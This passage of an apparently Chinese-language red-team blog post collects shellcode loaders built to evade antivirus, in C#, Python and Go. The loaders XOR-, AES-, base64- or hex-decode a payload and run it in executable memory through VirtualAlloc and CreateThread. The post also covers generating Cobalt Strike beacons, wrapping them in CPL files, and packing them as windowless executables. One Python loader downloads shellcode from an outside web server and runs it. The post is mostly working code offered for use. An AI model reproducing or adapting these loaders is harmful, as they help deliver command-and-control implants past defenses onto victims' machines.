class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line"></span><br><span class="line">How to compile:</span><br><span class="line">===============</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:encryptedShellcodeWrapper_xor.exe encryptedShellcodeWrapper_xor.cs</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace RunShellCode</span><br><span class="line">&#123;</span><br><span class="line">    static class Program</span><br><span class="line">    &#123;</span><br><span class="line">        //==============================================================================</span><br><span class="line">        // CRYPTO FUNCTIONS</span><br><span class="line">        //==============================================================================</span><br><span class="line">        private static T[] SubArray&lt;T&gt;(this T[] data, int index, int length)</span><br><span class="line">        &#123;</span><br><span class="line">            T[] result = new T[length];</span><br><span class="line">            Array.Copy(data, index, result, 0, length);</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static byte[] xor(byte[] cipher, byte[] key) &#123;</span><br><span class="line">            byte[] decrypted = new byte[cipher.Length];</span><br><span class="line"></span><br><span class="line">            for(int i = 0; i &lt; cipher.Length; i++) &#123;</span><br><span class="line">                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return decrypted;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        // Decrypts the given a plaintext message byte array with a given 128 bits key</span><br><span class="line">        // Returns the unencrypted message</span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        private static byte[] aesDecrypt(byte[] cipher, byte[] key)</span><br><span class="line">        &#123;</span><br><span class="line">            var IV = cipher.SubArray(0, 16);</span><br><span class="line">            var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);</span><br><span class="line"></span><br><span class="line">            // Create an AesManaged object with the specified key and IV.</span><br><span class="line">            using (AesManaged aes = new AesManaged())</span><br><span class="line">            &#123;</span><br><span class="line">                aes.Padding = PaddingMode.PKCS7;</span><br><span class="line">                aes.KeySize = 128;</span><br><span class="line">                aes.Key = key;</span><br><span class="line">                aes.IV = IV;</span><br><span class="line"></span><br><span class="line">                using (MemoryStream ms = new MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))</span><br><span class="line">                    &#123;</span><br><span class="line">                        cs.Write(encryptedMessage, 0, encryptedMessage.Length);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    return ms.ToArray();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //==============================================================================</span><br><span class="line">        // MAIN FUNCTION</span><br><span class="line">        //==============================================================================</span><br><span class="line">        static void Main()</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] encryptedShellcode = new byte[] &#123; &#125;;</span><br><span class="line">            string key = &quot;uknowsec&quot;;</span><br><span class="line">            string cipherType = &quot;xor&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            byte[] shellcode = null;</span><br><span class="line"></span><br><span class="line">            //--------------------------------------------------------------</span><br><span class="line">            // Decrypt the shellcode</span><br><span class="line">            if (cipherType == &quot;xor&quot;) &#123;</span><br><span class="line">                shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));</span><br><span class="line">            &#125;</span><br><span class="line">            else if (cipherType == &quot;aes&quot;) &#123;</span><br><span class="line">                shellcode = aesDecrypt(encryptedShellcode, Convert.FromBase64String(key));</span><br><span class="line">            &#125;</span><br><span class="line">                        </span><br><span class="line">            //--------------------------------------------------------------        </span><br><span class="line">            // Copy decrypted shellcode to memory</span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">            IntPtr hThread = IntPtr.Zero;</span><br><span class="line">            UInt32 threadId = 0;</span><br><span class="line"></span><br><span class="line">            // Prepare data</span><br><span class="line">            IntPtr pinfo = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            // Invoke the shellcode</span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line"></span><br><span class="line">        // The usual Win32 API trio functions: VirtualAlloc, CreateThread, WaitForSingleObject</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(</span><br><span class="line">            UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size,</span><br><span class="line">            UInt32 flAllocationType,</span><br><span class="line">            UInt32 flProtect</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(</span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(</span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="从资源里加载shelllcode">从资源里加载shelllcode</span></h3><p><a href="https://github.com/rvrsh3ll/CPLResourceRunner" target="_blank" rel="noopener">https://github.com/rvrsh3ll/CPLResourceRunner</a></p><p>用Cobalt Strike 生成shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attacks -&gt; Packages -&gt; Windows Executable (s) -&gt; Output =&gt; RAW (x86)</span><br></pre></td></tr></table></figure><p>用ConvertShellcode.py将生成的 beacon.bin转换成shellcode.txt</p><p>然后再转换成base64编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# python ConvertShellcode.py beacon.bin </span><br><span class="line">Shellcode written to shellcode.txt</span><br><span class="line">root@kali:~/Desktop# cat shellcode.txt |sed &apos;s/[, ]//g; s/0x//g;&apos; |tr -d &apos;\n&apos; |xxd -p -r |gzip -c |base64 &gt; b64shellcode.txt</span><br></pre></td></tr></table></figure><p>把生成的base64编码的shellcode复制到项目资源Resources.txt里</p><p>编译生成dll。</p><p>copy CPLResourceRunner.dll to RunMe.cpl</p><p><a href="http://www.anquan.us/static/drops/tips-16042.html" target="_blank" rel="noopener">三好学生-CPL文件利用介绍</a></p><h2><span id="python">Python</span></h2><h3><span id="源码加载">源码加载</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从我们的web服务器上下载shellcode</span></span><br><span class="line">url = <span class="string">"http://rinige.com/shellcode.bin"</span></span><br><span class="line">response = urllib2.urlopen(url)</span><br><span class="line"><span class="comment"># base64 解码 shellcode</span></span><br><span class="line">shellcode = base64.b64decode(response.read())</span><br><span class="line"><span class="comment"># 申请内存空间</span></span><br><span class="line">shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))</span><br><span class="line"><span class="comment"># 创建 shellcode 的函数指针</span></span><br><span class="line">shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE¬</span><br><span class="line">(ctypes.c_void_p))</span><br><span class="line"><span class="comment"># 执行 shellcode</span></span><br><span class="line">shellcode_func()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">shellcode = bytearray(&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;)</span><br><span class="line"></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line"> </span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line"></span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"> </span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure><p>PyInstaller将py转为exe</p><p>pyinstaller同样可以将.py程序打包成windows下可以执行的exe文件。<br>pyinstaller依赖于pywin32，在使用pyinstaller之前，应先安装pywin32</p><p>pywin32下载后，点击下一步安装即可<br><a href="https://sourceforge.net/projects/pywin32/files/pywin32" target="_blank" rel="noopener">https://sourceforge.net/projects/pywin32/files/pywin32</a><br>pyinstaller 下载后，解压，不用安装，即可使用<br><a href="https://github.com/pyinstaller/pyinstaller/releases" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller/releases</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstaller -F -w pyshellcode.py</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_10.png" alt=""></p><p>生成的exe文件3MB。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_11.png" alt=""></p><h4><span id="xor加密">xor加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf8 -*-</span><br><span class="line"># Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line">#</span><br><span class="line"># You can create a windows executable: pyinstaller --onefile --noconsole multibyteEncodedShellcode.py</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from ctypes import *</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#======================================================================================================</span><br><span class="line">#CRYPTO FUNCTIONS</span><br><span class="line">#======================================================================================================</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line"># data as a bytearray</span><br><span class="line"># key as a string</span><br><span class="line">def xor(data, key):</span><br><span class="line">l = len(key)</span><br><span class="line">keyAsInt = map(ord, key)</span><br><span class="line">return bytes(bytearray((</span><br><span class="line">    (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))</span><br><span class="line">)))</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line">def unpad(s):</span><br><span class="line">&quot;&quot;&quot;PKCS7 padding removal&quot;&quot;&quot;</span><br><span class="line">return s[:-ord(s[len(s)-1:])]</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line">def aesDecrypt(cipherText, key):</span><br><span class="line">&quot;&quot;&quot;Decrypt data with the provided key&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># Initialization Vector is in the first 16 bytes</span><br><span class="line">iv = cipherText[:AES.block_size]</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">return unpad(cipher.decrypt(cipherText[AES.block_size:]))</span><br><span class="line"></span><br><span class="line">#======================================================================================================</span><br><span class="line">#MAIN FUNCTION</span><br><span class="line">#======================================================================================================</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">encryptedShellcode = (&quot;&quot;)</span><br><span class="line">key = &quot;uknowsec&quot;</span><br><span class="line">cipherType = &quot;xor&quot;</span><br><span class="line"></span><br><span class="line"># Decrypt the shellcode</span><br><span class="line">if cipherType == &apos;xor&apos;:</span><br><span class="line">shellcode = xor(bytearray(encryptedShellcode), key)</span><br><span class="line">elif cipherType == &apos;aes&apos;:</span><br><span class="line">key = base64.b64decode(key)</span><br><span class="line">shellcode = aesDecrypt(encryptedShellcode, key)</span><br><span class="line">else:</span><br><span class="line">print &quot;[ERROR] Unknown cipher type&quot;</span><br><span class="line"></span><br><span class="line"># Copy the shellcode to memory and invoke it</span><br><span class="line">memory_with_shell = create_string_buffer(shellcode, len(shellcode))</span><br><span class="line">shell = cast(memory_with_shell,CFUNCTYPE(c_void_p))</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h4><span id="aes加密">aes加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf8 -*-</span><br><span class="line"># Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line">#</span><br><span class="line"># You can create a windows executable: pyinstaller --onefile --noconsole multibyteEncodedShellcode.py</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from ctypes import *</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#======================================================================================================</span><br><span class="line">#CRYPTO FUNCTIONS</span><br><span class="line">#======================================================================================================</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line"># data as a bytearray</span><br><span class="line"># key as a string</span><br><span class="line">def xor(data, key):</span><br><span class="line">l = len(key)</span><br><span class="line">keyAsInt = map(ord, key)</span><br><span class="line">return bytes(bytearray((</span><br><span class="line">    (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))</span><br><span class="line">)))</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line">def unpad(s):</span><br><span class="line">&quot;&quot;&quot;PKCS7 padding removal&quot;&quot;&quot;</span><br><span class="line">return s[:-ord(s[len(s)-1:])]</span><br><span class="line"></span><br><span class="line">#------------------------------------------------------------------------</span><br><span class="line">def aesDecrypt(cipherText, key):</span><br><span class="line">&quot;&quot;&quot;Decrypt data with the provided key&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># Initialization Vector is in the first 16 bytes</span><br><span class="line">iv = cipherText[:AES.block_size]</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">return unpad(cipher.decrypt(cipherText[AES.block_size:]))</span><br><span class="line"></span><br><span class="line">#======================================================================================================</span><br><span class="line">#MAIN FUNCTION</span><br><span class="line">#======================================================================================================</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">encryptedShellcode = (&quot;&quot;)</span><br><span class="line">key = &quot;Nv78rga+vzeTO+acx4EXCw==&quot;</span><br><span class="line">cipherType = &quot;aes&quot;</span><br><span class="line"></span><br><span class="line"># Decrypt the shellcode</span><br><span class="line">if cipherType == &apos;xor&apos;:</span><br><span class="line">shellcode = xor(bytearray(encryptedShellcode), key)</span><br><span class="line">elif cipherType == &apos;aes&apos;:</span><br><span class="line">key = base64.b64decode(key)</span><br><span class="line">shellcode = aesDecrypt(encryptedShellcode, key)</span><br><span class="line">else:</span><br><span class="line">print &quot;[ERROR] Unknown cipher type&quot;</span><br><span class="line"></span><br><span class="line"># Copy the shellcode to memory and invoke it</span><br><span class="line">memory_with_shell = create_string_buffer(shellcode, len(shellcode))</span><br><span class="line">shell = cast(memory_with_shell,CFUNCTYPE(c_void_p))</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h4><span id="base64加密">base64加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">encode_shellcode = &quot;&quot;</span><br><span class="line"></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line"></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</span><br></pre></td></tr></table></figure><h3><span id="加载器">加载器</span></h3><p><a href="https://www.cnblogs.com/k8gege/p/11223393.html" target="_blank" rel="noopener">Python免杀ShellCode加载器(Cobaltstrike/Metasploit)</a></p><h4><span id="hex加密">HEX加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#scrun by k8gege</span><br><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">#calc.exe</span><br><span class="line">#sc = &quot;DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4&quot;</span><br><span class="line">shellcode=bytearray(sys.argv[1].decode(&quot;hex&quot;))</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure><h4><span id="base64加密">base64加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#scrun by k8gege</span><br><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">#calc.exe</span><br><span class="line">#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==</span><br><span class="line">shellcode=bytearray(base64.b64decode(sys.argv[1]).decode(&quot;hex&quot;))</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure><h2><span id="go">Go</span></h2><h3><span id="内联c加载">内联C加载</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;C&quot;</span><br><span class="line">import &quot;unsafe&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    buf := &quot;&quot;</span><br><span class="line">    buf += &quot;\xdd\xc6\xd9\x74\x24\xf4\x5f\x33\xc9\xb8\xb3\x5e\x2c&quot;</span><br><span class="line">    ...省略...</span><br><span class="line">    buf += &quot;\xc9\xb1\x97\x31\x47\x1a\x03\x47\x1a\x83\xc7\x04\xe2&quot;</span><br><span class="line">    // at your call site, you can send the shellcode directly to the C</span><br><span class="line">    // function by converting it to a pointer of the correct type.</span><br><span class="line">    shellcode := []byte(buf)</span><br><span class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[0])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="加载器">加载器</span></h3><p><a 